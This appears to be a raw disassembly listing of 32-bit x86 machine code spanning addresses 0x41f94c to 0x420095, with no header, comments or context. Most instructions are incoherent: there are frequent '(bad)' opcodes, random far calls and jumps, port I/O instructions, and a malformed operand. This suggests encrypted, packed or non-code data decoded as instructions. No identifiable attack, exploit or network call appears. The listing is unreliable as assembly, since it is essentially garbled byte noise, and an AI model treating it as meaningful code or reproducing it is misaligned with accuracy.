  41f94c:	repnz mov gs,WORD PTR [ebx]
  41f94f:	pop    ebp
  41f950:	dec    ecx
  41f951:	popa   
  41f952:	(bad)  
  41f953:	xchg   edx,eax
  41f954:	push   esi
  41f955:	adc    DWORD PTR [ebp+ebp*2+0x37bcb785],eax
  41f95c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f95d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f95e:	add    BYTE PTR [edx],bh
  41f960:	pop    edx
  41f961:	xor    al,0x58
  41f963:	adc    al,0xab
  41f965:	adc    DWORD PTR [esi+ebp*1],esi
  41f968:	sbb    DWORD PTR [edi+0x2a4f34f7],edx
  41f96e:	and    al,0x34
  41f970:	jno    0x41f984
  41f972:	dec    ebx
  41f973:	ds push ds
  41f975:	push   cs
  41f976:	ins    DWORD PTR es:[edi],dx
  41f977:	scas   al,BYTE PTR es:[edi]
  41f978:	jnp    0x41f90b
  41f97a:	mov    dh,0x24
  41f97c:	jno    0x41f959
  41f97e:	ja     0x41f988
  41f980:	loop   0x41f98a
  41f982:	cs pop esp
  41f984:	rcl    DWORD PTR ds:0xa00cf1e3,0x23
  41f98b:	or     cl,ch
  41f98d:	rcl    DWORD PTR [edx+eiz*2],cl
  41f990:	push   ebp
  41f991:	mov    edx,0x702295a3
  41f996:	imul   ebx,DWORD PTR [edi+0x5d],0xd676ee1
  41f99d:	(bad)  
  41f99e:	jbe    0x41f94c
  41f9a0:	js     0x41f9ff
  41f9a2:	outs   dx,BYTE PTR ds:[esi]
  41f9a3:	repnz ror DWORD PTR [ebx+esi*2],cl
  41f9a7:	(bad)  
  41f9a8:	fsub   DWORD PTR [eax+esi*4+0x70]
  41f9ac:	aam    0x9f
  41f9ae:	(bad)  
  41f9af:	fcmovb st,st(5)
  41f9b1:	cmp    al,0xc6
  41f9b3:	sub    bl,bl
  41f9b5:	and    al,0xc0
  41f9b7:	add    ebp,esi
  41f9b9:	inc    ebp
  41f9ba:	pop    ebx
  41f9bb:	call   0xd899:0xc4f9d8fb
  41f9c2:	xor    ah,BYTE PTR [esi+0x3b3e841a]
  41f9c8:	nop
  41f9c9:	repz xor eax,0x32d482fd
  41f9cf:	daa    
  41f9d0:	aad    0xb7
  41f9d2:	(bad)  
  41f9d3:	sub    eax,0x523db190
  41f9d8:	ror    BYTE PTR [edi+0x40f7f078],0x1b
  41f9df:	xbegin 0x98db831d
  41f9e5:	adc    cl,BYTE PTR [eax+0x48]
  41f9e8:	fistp  WORD PTR [edx]
  41f9ea:	out    0xeb,eax
  41f9ec:	ja     0x41f978
  41f9ee:	mov    edi,0x43947da5
  41f9f3:	and    eax,0x8971a88d
  41f9f8:	sub    BYTE PTR [eax-0x1a],cl
  41f9fb:	gs (bad) 
  41f9fd:	fisubr WORD PTR [ebp+0x524ae295]
  41fa03:	fild   DWORD PTR ds:0xcf38cd58
  41fa09:	repnz sub al,0xbf
  41fa0c:	and    ch,dl
  41fa0e:	mov    cl,0x43
  41fa10:	jo     0x41f9ca
  41fa12:	addr16 pusha 
  41fa14:	fcom   st(2)
  41fa16:	xlat   BYTE PTR ds:[ebx]
  41fa17:	lock test BYTE PTR [esi],dh
  41fa1a:	inc    eax
  41fa1b:	pop    esi
  41fa1c:	mov    edx,0xe65d2c07
  41fa21:	out    0x6,al
  41fa23:	push   eax
  41fa24:	or     BYTE PTR [edi],0x4b
  41fa27:	stos   BYTE PTR es:[edi],al
  41fa28:	xor    esp,esp
  41fa2a:	(bad)  
  41fa2b:	sbb    ecx,DWORD PTR [ebp-0x561860de]
  41fa31:	out    0x80,eax
  41fa33:	push   cs
  41fa34:	inc    ebp
  41fa35:	xchg   esp,eax
  41fa36:	mov    BYTE PTR [edi-0x4eca486],bh
  41fa3c:	fwait
  41fa3d:	jb     0x41fa08
  41fa3f:	out    0xe2,al
  41fa41:	sub    edx,DWORD PTR [ecx+0x7f]
  41fa44:	jmp    0xa1317db3
  41fa49:	je     0x41f9ea
  41fa4b:	or     eax,0xf8b18d3f
  41fa50:	aad    0xae
  41fa52:	pop    eax
  41fa53:	push   0x60693698
  41fa58:	iret   
  41fa59:	pop    edi
  41fa5a:	xchg   esi,eax
  41fa5b:	add    BYTE PTR [eax-0x9039246],ah
  41fa61:	fcom   DWORD PTR [esi+0x5]
  41fa64:	sbb    al,0xd7
  41fa66:	dec    ebx
  41fa67:	mov    dl,0xd5
  41fa69:	es in  al,dx
  41fa6b:	aas    
  41fa6c:	pushf  
  41fa6d:	and    bl,ah
  41fa6f:	mov    ds:0x15ef3ac0,eax
  41fa74:	cdq    
  41fa75:	xchg   edi,eax
  41fa76:	mov    ds:0x7125d4d9,eax
  41fa7b:	mov    DWORD PTR [edx+0x23],ebx
  41fa7e:	xor    dl,BYTE PTR [edx+0x60]
  41fa81:	mov    esi,DWORD PTR [edi+0x35]
  41fa84:	cld    
  41fa85:	and    ch,ch
  41fa87:	xchg   esp,eax
  41fa88:	fldcw  WORD PTR [edi-0x39]
  41fa8b:	sub    DWORD PTR [ebx+0x11],esi
  41fa8e:	jae    0x41fa86
  41fa90:	fidiv  DWORD PTR [edi+esi*8+0x63dd6530]
  41fa97:	imul   ebx,DWORD PTR ds:0x6a3a658b,0xa3d7255a
  41faa1:	loopne 0x41fa58
  41faa3:	push   esp
  41faa4:	int3   
  41faa5:	cmp    ebp,DWORD PTR [ebx+0x3f]
  41faa8:	jg     0x41fab7
  41faaa:	ss dec eax
  41faac:	inc    ecx
  41faad:	lock js 0x41fa50
  41fab0:	push   es
  41fab1:	and    ecx,DWORD PTR [esi+0x3]
  41fab4:	adc    eax,0x58fa07ed
  41fab9:	(bad)  
  41fabb:	pop    ebx
  41fabc:	fadd   DWORD PTR [ecx]
  41fabe:	mov    bh,0x90
  41fac0:	inc    edi
  41fac1:	mov    esp,0xa2fc1c8c
  41fac6:	daa    
  41fac7:	(bad)  [eax+0x3a]
  41faca:	push   edi
  41facb:	dec    ebp
  41facc:	imul   edx,edi,0x2e
  41facf:	jl     0x41fac5
  41fad1:	pop    esp
  41fad2:	pusha  
  41fad3:	push   ebp
  41fad4:	and    ebx,DWORD PTR [ebp-0x33]
  41fad7:	dec    ecx
  41fad8:	push   0x2e
  41fada:	or     eax,0x408ffd60
  41fadf:	cmp    al,0x29
  41fae1:	xor    DWORD PTR [esp+eiz*8-0x74],ebx
  41fae5:	fidiv  DWORD PTR [ebx-0x21ae4123]
  41faeb:	sti    
  41faec:	push   eax
  41faed:	inc    ebx
  41faee:	xlat   BYTE PTR ds:[ebx]
  41faef:	fiadd  WORD PTR [ecx+0x5837c59d]
  41faf5:	ficomp DWORD PTR [edi]
  41faf7:	jmp    0x41fac9
  41faf9:	pop    ecx
  41fafa:	mov    cl,BYTE PTR [eax-0x6fbcffa]
  41fb00:	sbb    al,al
  41fb02:	loopne 0x41fb29
  41fb04:	in     eax,dx
  41fb05:	pushf  
  41fb06:	push   eax
  41fb07:	imul   eax,DWORD PTR [edx],0xd6a79859
  41fb0d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fb0e:	clc    
  41fb0f:	sbb    esp,DWORD PTR [ecx+0x61b424b6]
  41fb15:	jge    0x41fb40
  41fb17:	cwde   
  41fb18:	retf   
  41fb19:	inc    edi
  41fb1a:	push   0x67748902
  41fb1f:	push   esp
  41fb20:	rol    ebp,cl
  41fb22:	mov    cl,0x48
  41fb24:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fb25:	call   0x8b56:0xea98eea7
  41fb2c:	adc    esi,ecx
  41fb2e:	push   esi
  41fb2f:	pop    ss
  41fb30:	fsub   QWORD PTR [edx+0x67]
  41fb33:	and    eax,DWORD PTR [eax]
  41fb35:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fb36:	(bad)  
  41fb37:	test   dh,al
  41fb39:	mov    cl,0xdc
  41fb3b:	push   ds
  41fb3c:	jnp    0x41fac5
  41fb3e:	adc    DWORD PTR [esi+edx*8+0x2c],ecx
  41fb42:	jle    0x41fb0b
  41fb44:	sahf   
  41fb45:	rcl    DWORD PTR [eax+0x4f],cl
  41fb48:	sub    al,BYTE PTR [edx-0x2a2ef5d]
  41fb4e:	xchg   ebx,eax
  41fb4f:	lds    ebx,FWORD PTR [eax+0x35]
  41fb52:	jbe    0x41fb0a
  41fb54:	mov    ebx,ecx
  41fb56:	xor    edx,0x9d2b8af8
  41fb5c:	mov    cl,0x2
  41fb5e:	jmp    0x41fdfb
  41fb63:	dec    edi
  41fb64:	inc    ebp
  41fb65:	imul   DWORD PTR [ebx-0x3]
  41fb68:	jns    0x41fbc1
  41fb6a:	gs ret 
  41fb6c:	loopne 0x41faf3
  41fb6e:	cmp    ebx,DWORD PTR [ebx]
  41fb70:	mov    cs,edx
  41fb72:	sti    
  41fb73:	adc    al,0xa2
  41fb75:	sar    DWORD PTR [ebx-0x4444404e],0x92
  41fb7c:	push   ds
  41fb7d:	or     al,0x2
  41fb7f:	inc    ecx
  41fb80:	ror    DWORD PTR ds:0x6a939476,1
  41fb86:	test   al,0x45
  41fb88:	cli    
  41fb89:	mov    cl,0xf0
  41fb8b:	and    al,0x23
  41fb8d:	pop    DWORD PTR [eax+ecx*1]
  41fb90:	jb     0x41fb52
  41fb92:	sbb    eax,0xc13f058e
  41fb97:	push   0x49
  41fb99:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fb9a:	jmp    0x3925:0xabd622dc
  41fba1:	popa   
  41fba2:	(bad)  [ebx]
  41fba4:	xor    esp,DWORD PTR [edx-0x1590110d]
  41fbaa:	sbb    al,0x64
  41fbac:	push   ds
  41fbad:	jbe    0x41fb90
  41fbaf:	cmp    BYTE PTR [esi+0x65],cl
  41fbb2:	add    al,0x8f
  41fbb4:	into   
  41fbb5:	loopne 0x41fb91
  41fbb7:	mov    cl,0x87
  41fbb9:	pop    es
  41fbba:	cmp    eax,0xc14a15b5
  41fbbf:	mov    bl,0x19
  41fbc1:	les    eax,FWORD PTR [esi]
  41fbc3:	popf   
  41fbc4:	ficomp DWORD PTR [edi-0x2f]
  41fbc7:	dec    edx
  41fbc8:	mov    al,0xaf
  41fbca:	dec    esp
  41fbcb:	jbe    0x41fc12
  41fbcd:	fiadd  DWORD PTR [ecx-0x45]
  41fbd0:	pop    ds
  41fbd1:	js     0x41fb6b
  41fbd3:	xchg   ecx,eax
  41fbd4:	jge    0x41fc2a
  41fbd6:	iret   
  41fbd7:	jmp    0x41fb70
  41fbd9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fbda:	add    al,0x60
  41fbdc:	out    0xa1,al
  41fbde:	xchg   ecx,eax
  41fbdf:	ret    0x4a5c
  41fbe2:	sbb    eax,DWORD PTR [esi-0x3751c3c5]
  41fbe8:	lods   eax,DWORD PTR ds:[esi]
  41fbe9:	ins    DWORD PTR es:[edi],dx
  41fbea:	addr16 clc 
  41fbec:	outs   dx,BYTE PTR ds:[esi]
  41fbed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fbee:	data16 aas 
  41fbf0:	pop    ds
  41fbf1:	in     eax,0x6f
  41fbf3:	cmp    esp,DWORD PTR [ebx-0x40]
  41fbf6:	inc    ecx
  41fbf7:	cmc    
  41fbf8:	adc    DWORD PTR [edx],esi
  41fbfa:	ret    
  41fbfb:	sbb    ebp,DWORD PTR [edx+edi*4-0x13e81062]
  41fc02:	add    al,0x30
  41fc04:	pop    ebp
  41fc05:	fmul   QWORD PTR [eax]
  41fc07:	jg     0x41fbff
  41fc09:	in     al,dx
  41fc0a:	popa   
  41fc0b:	jne    0x41fc0b
  41fc0d:	jbe    0x41fbee
  41fc0f:	jo     0x41fbdc
  41fc11:	add    DWORD PTR [eax],ebx
  41fc13:	aas    
  41fc14:	pop    edi
  41fc15:	fwait
  41fc16:	mov    bh,dl
  41fc18:	in     eax,dx
  41fc19:	fcomp  st(6)
  41fc1b:	xor    al,ah
  41fc1d:	test   DWORD PTR [esi-0x2c6d13a0],edx
  41fc23:	pop    edi
  41fc24:	mov    bh,0xe9
  41fc26:	adc    BYTE PTR [esi],0xa6
  41fc29:	push   ecx
  41fc2a:	int3   
  41fc2b:	ins    DWORD PTR es:[edi],dx
  41fc2c:	imul   ebx,DWORD PTR [edx],0x55
  41fc2f:	cmp    ch,BYTE PTR [eax]
  41fc31:	jmp    0x41fc6b
  41fc33:	and    eax,0x43f11c39
  41fc38:	je     0x41fbe3
  41fc3a:	cli    
  41fc3b:	fnsave [ecx+edx*8]
  41fc3e:	xchg   edx,eax
  41fc3f:	and    eax,DWORD PTR [edx-0x24]
  41fc42:	fwait
  41fc43:	push   es
  41fc44:	arpl   WORD PTR [esi],cx
  41fc46:	ret    
  41fc47:	clc    
  41fc48:	popa   
  41fc49:	ins    BYTE PTR es:[edi],dx
  41fc4a:	jne    0x41fbf8
  41fc4c:	jl     0x41fcae
  41fc4e:	jp     0x41fc95
  41fc50:	fwait
  41fc51:	xchg   DWORD PTR [edi+0x58969c76],ecx
  41fc57:	xchg   ebp,eax
  41fc58:	push   0xffffff94
  41fc5a:	mov    al,BYTE PTR [ecx]
  41fc5c:	push   esi
  41fc5d:	sub    al,0xe7
  41fc5f:	sub    BYTE PTR [ebx+0x60],al
  41fc62:	mov    ah,BYTE PTR [ecx+ebx*2]
  41fc65:	push   ecx
  41fc66:	push   ss
  41fc67:	mov    BYTE PTR [esp+ebx*8],bh
  41fc6a:	dec    edi
  41fc6b:	fwait
  41fc6c:	test   BYTE PTR [edx],0x9e
  41fc6f:	jg     0x41fc00
  41fc71:	inc    eax
  41fc72:	xlat   BYTE PTR ds:[ebx]
  41fc73:	(bad)  
  41fc74:	xor    eax,0xd552ed6b
  41fc79:	std    
  41fc7a:	stos   DWORD PTR es:[edi],eax
  41fc7b:	xor    DWORD PTR [esi-0x5a],0xffffffec
  41fc7f:	cmp    eax,0xfed60370
  41fc84:	enter  0xbc47,0xc5
  41fc88:	pop    esp
  41fc89:	jne    0x41fce9
  41fc8b:	sbb    eax,eax
  41fc8d:	mov    ah,0x53
  41fc8f:	xor    cl,ah
  41fc91:	xchg   esp,eax
  41fc92:	jne    0x41fcd4
  41fc94:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fc95:	sbb    eax,0xfb8d422a
  41fc9a:	ds mov ecx,0xcf324061
  41fca0:	out    dx,al
  41fca1:	aaa    
  41fca2:	outs   dx,BYTE PTR ds:[esi]
  41fca3:	nop
  41fca4:	lea    esi,[eax]
  41fca6:	ds popa 
  41fca8:	add    edi,0xffffffeb
  41fcab:	jnp    0x41fc8b
  41fcad:	xchg   esp,eax
  41fcae:	scas   eax,DWORD PTR es:[edi]
  41fcaf:	mov    ds:0x4273ce25,eax
  41fcb4:	dec    edx
  41fcb5:	int3   
  41fcb6:	imul   edx,ebp,0xffffffc2
  41fcb9:	bnd jbe 0x41fcba
  41fcbc:	pop    ds
  41fcbd:	imul   eax,edx,0xcb9f9a4e
  41fcc3:	adc    eax,0xc701f95d
  41fcc8:	and    edi,DWORD PTR [ecx+0x3e32caee]
  41fcce:	add    BYTE PTR [edi-0x779e584],ah
  41fcd4:	inc    esi
  41fcd5:	(bad)  
  41fcd7:	pop    ss
  41fcd8:	mov    al,0x61
  41fcda:	es lock pop eax
  41fcdd:	sub    al,BYTE PTR ds:0x76b29056
  41fce3:	in     al,0xd6
  41fce5:	gs cld 
  41fce7:	push   ds
  41fce8:	mov    cl,0x33
  41fcea:	jmp    0x41fc70
  41fcec:	xor    ebp,DWORD PTR [esi-0x5d8f80c3]
  41fcf2:	dec    ebx
  41fcf3:	and    BYTE PTR [eax],ch
  41fcf5:	mov    ecx,0xcd18a601
  41fcfa:	sbb    ch,bh
  41fcfc:	mov    ds:0x67557c05,al
  41fd01:	add    al,0x33
  41fd03:	(bad)  
  41fd04:	fmul   DWORD PTR [edx+esi*4]
  41fd07:	pop    ecx
  41fd08:	fs jge 0x41fd61
  41fd0b:	loope  0x41fd83
  41fd0d:	lds    edi,FWORD PTR [eax-0x46]
  41fd10:	cdq    
  41fd11:	pop    esp
  41fd12:	mov    esp,0x7c3b81e
  41fd17:	mov    ecx,0x9f32877
  41fd1c:	pusha  
  41fd1d:	retf   0xd452
  41fd20:	push   edx
  41fd21:	pop    edi
  41fd22:	popa   
  41fd23:	not    DWORD PTR [edi+eax*4]
  41fd26:	mov    esp,ebp
  41fd28:	sbb    ch,BYTE PTR [esi]
  41fd2a:	mov    ebp,0x35566eb4
  41fd2f:	cmc    
  41fd30:	sbb    ch,BYTE PTR [ebx]
  41fd32:	test   BYTE PTR [esi],bl
  41fd34:	mov    BYTE PTR ds:0xe73418a4,bh
  41fd3a:	lahf   
  41fd3b:	cmp    ah,BYTE PTR [esi+0x6c]
  41fd3e:	stc    
  41fd3f:	jg     0x41fd5a
  41fd41:	xor    al,0xc7
  41fd43:	or     eax,0x7a15528d
  41fd48:	(bad)  
  41fd4a:	mov    esp,DWORD PTR [ecx+0x17]
  41fd4d:	mov    al,0x8c
  41fd4f:	scas   al,BYTE PTR es:[edi]
  41fd50:	test   BYTE PTR [edx+0x41e79732],0x68
  41fd57:	test   bh,dl
  41fd59:	push   esi
  41fd5a:	bound  eax,QWORD PTR [ebp-0x188e68c1]
  41fd60:	loop   0x41fdc3
  41fd62:	pushf  
  41fd63:	mov    esp,0x357728b5
  41fd68:	popf   
  41fd69:	push   ss
  41fd6a:	xchg   ebx,esp
  41fd6c:	dec    esi
  41fd6d:	test   eax,0xa0ab6b35
  41fd72:	adc    al,al
  41fd74:	repz push cs
  41fd76:	adc    dh,BYTE PTR [esi]
  41fd78:	shl    BYTE PTR [ecx+ebx*2+0x15a3c5e5],cl
  41fd7f:	cmp    DWORD PTR [ecx+0x5d34ebf8],ecx
  41fd85:	sbb    eax,0xff0b3f1
  41fd8a:	xor    al,0x9c
  41fd8c:	repz sahf 
  41fd8e:	mov    WORD PTR [ecx+0x42077bb0],gs
  41fd94:	data16 mov bl,0xcd
  41fd97:	mov    ch,0xe9
  41fd99:	pop    ss
  41fd9a:	mov    edi,0x964c017f
  41fd9f:	push   eax
  41fda0:	jnp    0x41fe11
  41fda2:	and    BYTE PTR [ecx+0x64],0x80
  41fda6:	je     0x41fdda
  41fda8:	retf   0x32da
  41fdab:	out    0x83,al
  41fdad:	adc    dh,BYTE PTR ds:[eax+0x2cb87733]
  41fdb4:	ds push ebx
  41fdb6:	outs   dx,BYTE PTR ds:[esi]
  41fdb7:	iret   
  41fdb8:	call   0x4838:0xecf19e38
  41fdbf:	aad    0x1d
  41fdc1:	lahf   
  41fdc2:	in     al,dx
  41fdc3:	mov    ?,WORD PTR [ebx+0x7c]
  41fdc6:	xor    cl,BYTE PTR [edi]
  41fdc8:	imul   bl
  41fdca:	loop   0x41fda5
  41fdcc:	fst    QWORD PTR [ebp-0x34]
  41fdcf:	test   eax,0xa50cb9d2
  41fdd4:	xor    al,0xc5
  41fdd6:	jb     0x41fdba
  41fdd8:	addr16 or eax,0xefb4e1ca
  41fdde:	mov    eax,0x696a0517
  41fde3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fde4:	es (bad) 
  41fde6:	fcom   QWORD PTR [esi+ebx*4-0x51b9706d]
  41fded:	adc    BYTE PTR [ecx],bh
  41fdef:	jnp    0x41fdde
  41fdf1:	adc    DWORD PTR [esi],edx
  41fdf3:	xchg   DWORD PTR [ebp+0x1160bd77],esi
  41fdf9:	dec    esp
  41fdfa:	pop    ebp
  41fdfb:	call   0x4069e2
  41fe00:	mov    esi,eax
  41fe02:	jmp    0x42009f
  41fe07:	push   esi
  41fe08:	push   esp
  41fe09:	lods   eax,DWORD PTR ds:[esi]
  41fe0a:	push   ebx
  41fe0b:	lods   eax,DWORD PTR ds:[esi]
  41fe0c:	mov    bl,0xbc
  41fe0e:	push   ebp
  41fe0f:	mov    eax,ds:0x71712fc3
  41fe14:	lock loopne 0x41fe12
  41fe17:	or     eax,0xb2bbc1a6
  41fe1c:	mov    edi,0xbd4bbbbb
  41fe21:	add    ch,BYTE PTR ds:[eax-0x70]
  41fe25:	mov    dl,dl
  41fe27:	add    esi,0xffffffe7
  41fe2a:	out    0x2b,al
  41fe2c:	test   al,0xd9
  41fe2e:	sahf   
  41fe2f:	ja     0x41fde2
  41fe31:	rcr    BYTE PTR [ebp+0x3c14a569],cl
  41fe37:	and    cl,BYTE PTR [edi+edx*1]
  41fe3a:	int3   
  41fe3b:	outs   dx,DWORD PTR ds:[esi]
  41fe3c:	and    eax,0x7272272f
  41fe41:	sbb    BYTE PTR [edx+0x746aa0ea],0x82
  41fe48:	ss jae 0x41fe26
  41fe4b:	and    BYTE PTR [edx],cl
  41fe4d:	jnp    0x41fddf
  41fe4f:	loop   0x41fea1
  41fe51:	leave  
  41fe52:	sbb    ecx,DWORD PTR [edx-0x4a15a852]
  41fe58:	call   0x332b:0x1213eb96
  41fe5f:	ja     0x41fedb
  41fe61:	xchg   bh,dl
  41fe63:	ss out 0xc5,eax
  41fe66:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fe67:	xchg   BYTE PTR [edx],bl
  41fe69:	sti    
  41fe6a:	add    al,0xfd
  41fe6c:	pop    ds
  41fe6d:	pop    eax
  41fe6e:	jae    0x41fe48
  41fe70:	cmp    eax,esi
  41fe72:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fe73:	inc    edi
  41fe74:	(bad)  
  41fe75:	ret    0x820e
  41fe78:	mov    ecx,0xe732cbac
  41fe7d:	mov    dl,0x2c
  41fe7f:	jnp    0x41fec0
  41fe81:	and    DWORD PTR [eax+0xc521c77],eax
  41fe87:	fmul   DWORD PTR [edx-0x47500c93]
  41fe8d:	xlat   BYTE PTR ds:[ebx]
  41fe8e:	xchg   ebp,eax
  41fe8f:	xlat   BYTE PTR ds:[ebx]
  41fe90:	stos   BYTE PTR es:[edi],al
  41fe91:	sar    BYTE PTR [ebx+ecx*2-0x4bda1a83],cl
  41fe98:	mov    BYTE PTR [edx-0x6290bce1],bh
  41fe9e:	stos   DWORD PTR es:[edi],eax
  41fe9f:	fst    QWORD PTR [esi-0xd]
  41fea2:	xrelease xchg DWORD PTR [ebp-0x1ebd8081],eax
  41fea9:	retf   0x5974
  41feac:	sbb    eax,0x40928a31
  41feb1:	push   ds
  41feb2:	gs test eax,0xccda49f6
  41feb8:	xor    DWORD PTR [esi-0x7b],esp
  41febb:	inc    esi
  41febc:	sub    edi,ecx
  41febe:	xchg   edi,eax
  41febf:	inc    ebp
  41fec0:	(bad)  
  41fec2:	sahf   
  41fec3:	and    DWORD PTR [edi],edx
  41fec5:	mov    eax,ds:0x3c533351
  41feca:	xor    DWORD PTR [ebp-0x9],edx
  41fecd:	inc    ebp
  41fece:	mov    al,ds:0xd2392814
  41fed3:	test   eax,0x51fb5979
  41fed8:	call   ebp
  41feda:	sbb    dh,BYTE PTR [ecx-0x3e9670d]
  41fee0:	int    0xde
  41fee2:	fsub   QWORD PTR [ecx+0x7c04f1c8]
  41fee8:	push   esi
  41fee9:	xchg   edx,eax
  41feea:	mov    bh,0x8c
  41feec:	adc    esp,DWORD PTR [edx]
  41feee:	mov    es,WORD PTR [esi-0x4610e632]
  41fef4:	popf   
  41fef5:	stos   BYTE PTR es:[edi],al
  41fef6:	and    DWORD PTR [edx-0x26],ecx
  41fef9:	jecxz  0x41fef9
  41fefb:	sbb    al,0x6f
  41fefd:	push   ebx
  41fefe:	sbb    ah,bl
  41ff00:	push   es
  41ff01:	dec    edx
  41ff02:	cmp    dh,BYTE PTR [ebx-0x5a]
  41ff05:	in     al,0x94
  41ff07:	inc    edx
  41ff08:	fwait
  41ff09:	rcl    ah,1
  41ff0b:	and    al,0x84
  41ff0d:	ds dec ebp
  41ff0f:	outs   dx,DWORD PTR ds:[esi]
  41ff10:	cmp    eax,0xe33d1ba6
  41ff15:	(bad)  
  41ff16:	inc    edi
  41ff17:	es test al,0x77
  41ff1a:	sbb    BYTE PTR [ebx-0x5e0a2b11],ch
  41ff20:	sub    edx,DWORD PTR [edx+ebp*1+0x79]
  41ff24:	sbb    BYTE PTR [edi],dl
  41ff26:	push   ebx
  41ff27:	mov    al,ds:0x6d17f456
  41ff2c:	in     al,dx
  41ff2d:	pop    edx
  41ff2e:	mov    ebx,0x78ccc578
  41ff33:	fwait
  41ff34:	xor    ebx,ecx
  41ff36:	test   eax,0x885e094a
  41ff3b:	mov    dl,BYTE PTR [esp+ebp*4]
  41ff3e:	clc    
  41ff3f:	jp     0x41fed8
  41ff41:	(bad)  
  41ff42:	leave  
  41ff43:	aad    0x30
  41ff45:	pop    esi
  41ff46:	cdq    
  41ff47:	cmp    bl,BYTE PTR [ebx]
  41ff49:	mov    gs,WORD PTR [eax+0xe047169]
  41ff4f:	sbb    cl,BYTE PTR [edi-0xa3b8b48]
  41ff55:	jne    0x41fee3
  41ff57:	addps  xmm5,XMMWORD PTR [ebx-0x49f0ad58]
  41ff5e:	ds or  edi,ecx
  41ff61:	iret   
  41ff62:	fnstsw WORD PTR [edx+0x24]
  41ff65:	fdivr  QWORD PTR [edx-0x2b4d923b]
  41ff6b:	or     eax,0x94edff31
  41ff70:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ff71:	cs loope 0x41ffb4
  41ff74:	frstor [esi+ebp*8]
  41ff77:	mul    DWORD PTR [ebp+0x527fdeb8]
  41ff7d:	adc    BYTE PTR [edx+0x47],0xfe
  41ff81:	sbb    eax,DWORD PTR [edx]
  41ff83:	xchg   esp,eax
  41ff84:	pop    edi
  41ff85:	mov    dh,0xa
  41ff87:	adc    al,BYTE PTR ss:[edx+edx*8]
  41ff8b:	jmp    0x420008
  41ff8d:	shl    ebx,cl
  41ff8f:	xlat   BYTE PTR ds:[ebx]
  41ff90:	icebp  
  41ff91:	js     0x41ff3b
  41ff93:	aaa    
  41ff94:	inc    edx
  41ff95:	icebp  
  41ff96:	adc    BYTE PTR [esi],dh
  41ff98:	ja     0x41ff38
  41ff9a:	add    eax,0xa287d940
  41ff9f:	push   ss
  41ffa0:	nop
  41ffa1:	and    edi,DWORD PTR [ebx]
  41ffa3:	imul   edx,DWORD PTR [eax],0xfc0d03fe
  41ffa9:	mov    ecx,0xc8abfbfe
  41ffae:	jecxz  0x41ffde
  41ffb0:	adc    ebx,DWORD PTR ds:0xb927cd70
  41ffb6:	nop
  41ffb7:	out    0xbf,al
  41ffb9:	stos   BYTE PTR es:[edi],al
  41ffba:	call   0xe7f4718e
  41ffbf:	shr    DWORD PTR [ebx],0x6c
  41ffc2:	iret   
  41ffc3:	pop    ds
  41ffc4:	dec    ecx
  41ffc5:	pop    edi
  41ffc6:	push   es
  41ffc7:	fmul   DWORD PTR [eax-0x4f695922]
  41ffcd:	xchg   esi,eax
  41ffce:	(bad)  
  41ffcf:	sub    esp,ebp
  41ffd1:	outs   dx,DWORD PTR ds:[esi]
  41ffd2:	js     0x41ffee
  41ffd4:	cs fsub st,st(4)
  41ffd7:	(bad)  
  41ffd8:	repnz sub edi,DWORD PTR [edx]
  41ffdb:	fidiv  DWORD PTR [edi]
  41ffdd:	(bad)  
  41ffde:	and    BYTE PTR [ebp+ebp*2-0x148f11fb],bl
  41ffe5:	in     al,0xac
  41ffe7:	sub    al,0x3f
  41ffe9:	repnz stc 
  41ffeb:	sbb    DWORD PTR [ebx-0x6eedd66a],eax
  41fff1:	push   es
  41fff2:	jp     0x42005f
  41fff4:	and    ch,ah
  41fff6:	adc    BYTE PTR [ebx+eax*4+0x36c4079e],cl
  41fffd:	jg     0x41ffb6
  41ffff:	sbb    al,0x60
  420001:	fsubr  DWORD PTR [esi+0x37]
  420004:	mov    esi,0x25467539
  420009:	fst    DWORD PTR [ebp+0x79989f60]
  42000f:	dec    esp
  420010:	or     esp,0xcd81c4b
  420016:	xchg   ecx,eax
  420017:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420018:	dec    ecx
  420019:	push   esp
  42001a:	fcmovnbe st,st(7)
  42001c:	xor    eax,0x4d68012f
  420021:	rcr    DWORD PTR ds:0xef6120c1,cl
  420027:	callw  0x43f1
  42002b:	jmp    0x41ffb0
  42002d:	sub    DWORD PTR [ecx+eax*1+0x11],edi
  420031:	mov    gs,WORD PTR [edi-0x1a]
  420034:	ret    0xbf92
  420037:	xchg   edx,eax
  420038:	push   eax
  420039:	dec    esi
  42003a:	sbb    ebp,DWORD PTR [edx-0x59037877]
  420040:	mov    ecx,0x8e4c74e
  420045:	dec    esi
  420046:	mov    ds:0x80c9790e,al
  42004b:	fsub   QWORD PTR [esi+eax*1+0x38060da8]
  420052:	loopne 0x42007e
  420054:	clc    
  420055:	ja     0x420094
  420057:	imul   eax,DWORD PTR [ecx],0xf8de17c0
  42005d:	pop    esi
  42005e:	push   ds
  42005f:	mov    cl,0x4e
  420061:	sbb    al,0x2a
  420063:	outs   dx,BYTE PTR ds:[esi]
  420064:	jns    0x4200d8
  420066:	pushf  
  420067:	into   
  420068:	xchg   edx,eax
  420069:	xchg   ebx,eax
  42006a:	sti    
  42006b:	mov    ss,WORD PTR [ebx+0x73]
  42006e:	xchg   ebx,eax
  42006f:	jns    0x420013
  420071:	aaa    
  420072:	mov    DWORD PTR [ecx-0x73],ebx
  420075:	nop
  420076:	dec    ebp
  420077:	call   0xa877f28c
  42007c:	fst    QWORD PTR [edx+ecx*8-0x4f452868]
  420083:	aad    0x2f
  420085:	sub    al,0xaa
  420087:	inc    ebx
  420088:	dec    ebx
  420089:	loope  0x4200ab
  42008b:	ins    DWORD PTR es:[edi],dx
  42008c:	test   BYTE PTR [ecx+0xf9c8217],0xe8
  420093:	inc    ebx
  420094:	pop    edi
  420095:	cmc    
